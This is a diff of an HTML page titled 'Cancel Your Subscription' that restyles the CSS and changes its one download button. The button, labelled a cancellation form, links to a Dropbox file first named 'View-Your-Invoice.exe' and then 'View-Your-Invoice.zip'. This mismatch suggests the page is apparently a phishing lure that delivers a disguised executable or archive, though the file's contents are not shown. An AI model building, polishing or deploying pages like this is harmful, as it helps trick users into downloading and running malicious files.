@@ -6,9 +6,6 @@
   <title>Cancel Subscription</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
@@ -19,44 +16,38 @@
       height: 100vh;
     }
     .card {
-      background: #ffffff;
-      padding: 3rem 2.5rem;
+      background: white;
+      padding: 2.5rem;
       border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
       text-align: center;
       max-width: 480px;
       width: 100%;
-      animation: fadeIn 0.6s ease-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
     h1 {
-      margin: 0 0 1rem;
-      color: #1f2937;
       font-size: 2rem;
+      margin-bottom: 1rem;
+      color: #1f2937;
     }
     p {
       color: #4b5563;
-      margin-bottom: 2rem;
       font-size: 1rem;
-      line-height: 1.5;
+      margin-bottom: 2rem;
     }
-    a.download-btn {
+    .download-btn {
       display: inline-block;
+      padding: 0.9rem 1.8rem;
       background-color: #2563eb;
       color: white;
-      padding: 0.85rem 1.6rem;
-      font-size: 1rem;
+      border: none;
       border-radius: 8px;
-      text-decoration: none;
+      font-size: 1rem;
       font-weight: 600;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.1);
-      transition: background 0.3s, transform 0.2s;
+      text-decoration: none;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
-    a.download-btn:hover {
-      background-color: #1e40af;
+    .download-btn:hover {
+      background-color: #1d4ed8;
       transform: scale(1.03);
     }
   </style>
@@ -64,12 +55,10 @@
 <body>
   <div class="card">
     <h1>Cancel Your Subscription</h1>
-    <p>Download the cancellation form by clicking the button below. After filling it out, follow the instructions to cancel your subscription easily.</p>
-    <a 
-      class="download-btn" 
-      href="https://www.dropbox.com/scl/fi/dt3k9zf0bydt6mj286hsz/View-Your-Invoice.exe?rlkey=jky7ku5pod2e2s8njwfkncw7o&st=5hy2qcr3&dl=1" 
-      download
-    >
+    <p>Click the button below to download the cancellation form. After filling it, follow the included instructions to cancel your subscription.</p>
+
+    <!-- CHANGE THIS LINK to match your actual file -->
+    <a class="download-btn" href="https://www.dropbox.com/scl/fi/dt3k9zf0bydt6mj286hsz/View-Your-Invoice.zip?rlkey=jky7ku5pod2e2s8njwfkncw7o&st=5hy2qcr3&dl=1">
       📥 Download Cancellation Form
     </a>
   </div>
